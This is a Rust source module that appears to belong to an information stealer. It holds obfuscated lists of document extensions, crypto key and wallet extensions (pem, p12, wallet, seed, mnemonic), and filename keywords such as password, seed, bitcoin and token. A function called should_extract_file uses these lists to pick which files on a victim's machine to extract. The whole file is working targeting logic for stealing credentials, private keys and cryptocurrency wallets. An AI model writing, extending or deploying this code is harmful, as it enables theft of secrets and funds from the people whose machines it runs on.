use crate::sprotect;

pub fn get_document_extensions() -> Vec<String> {
    vec![
        sprotect!("txt").to_string(),
        sprotect!("doc").to_string(),
        sprotect!("docx").to_string(),
        sprotect!("pdf").to_string(),
        sprotect!("rtf").to_string(),
        sprotect!("odt").to_string(),
        sprotect!("xls").to_string(),
        sprotect!("xlsx").to_string(),
        sprotect!("ppt").to_string(),
        sprotect!("pptx").to_string(),
        sprotect!("csv").to_string(),
        sprotect!("xml").to_string(),
        sprotect!("json").to_string(),
        sprotect!("yml").to_string(),
        sprotect!("yaml").to_string(),
        sprotect!("ini").to_string(),
        sprotect!("cfg").to_string(),
        sprotect!("conf").to_string(),
        sprotect!("config").to_string(),
        sprotect!("log").to_string(),
    ]
}

pub fn get_crypto_extensions() -> Vec<String> {
    vec![
        sprotect!("key").to_string(),
        sprotect!("pem").to_string(),
        sprotect!("cert").to_string(),
        sprotect!("crt").to_string(),
        sprotect!("p12").to_string(),
        sprotect!("pfx").to_string(),
        sprotect!("keystore").to_string(),
        sprotect!("jks").to_string(),
        sprotect!("wallet").to_string(),
        sprotect!("dat").to_string(),
        sprotect!("keys").to_string(),
        sprotect!("seed").to_string(),
        sprotect!("backup").to_string(),
        sprotect!("recovery").to_string(),
        sprotect!("mnemonic").to_string(),
    ]
}

pub fn get_sensitive_patterns() -> Vec<String> {
    vec![
        sprotect!("password").to_string(),
        sprotect!("pass").to_string(),
        sprotect!("secret").to_string(),
        sprotect!("private").to_string(),
        sprotect!("key").to_string(),
        sprotect!("seed").to_string(),
        sprotect!("phrase").to_string(),
        sprotect!("mnemonic").to_string(),
        sprotect!("wallet").to_string(),
        sprotect!("backup").to_string(),
        sprotect!("recovery").to_string(),
        sprotect!("bitcoin").to_string(),
        sprotect!("ethereum").to_string(),
        sprotect!("crypto").to_string(),
        sprotect!("credential").to_string(),
        sprotect!("account").to_string(),
        sprotect!("login").to_string(),
        sprotect!("auth").to_string(),
        sprotect!("token").to_string(),
        sprotect!("api").to_string(),
    ]
}

pub fn is_document_file(file_path: &str) -> bool {
    let extensions = get_document_extensions();
    if let Some(ext) = std::path::Path::new(file_path).extension() {
        if let Some(ext_str) = ext.to_str() {
            return extensions.contains(&ext_str.to_lowercase());
        }
    }
    false
}

pub fn is_crypto_file(file_path: &str) -> bool {
    let extensions = get_crypto_extensions();
    if let Some(ext) = std::path::Path::new(file_path).extension() {
        if let Some(ext_str) = ext.to_str() {
            return extensions.contains(&ext_str.to_lowercase());
        }
    }
    false
}

pub fn has_sensitive_name(file_path: &str) -> bool {
    let patterns = get_sensitive_patterns();
    let filename_lower = std::path::Path::new(file_path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_lowercase();
    
    patterns.iter().any(|pattern| filename_lower.contains(pattern))
}

pub fn should_extract_file(file_path: &str, file_size: u64) -> bool {
    if file_size == 0 || file_size > 100_000_000 {
        return false;
    }
    
    is_document_file(file_path) || is_crypto_file(file_path) || has_sensitive_name(file_path)
}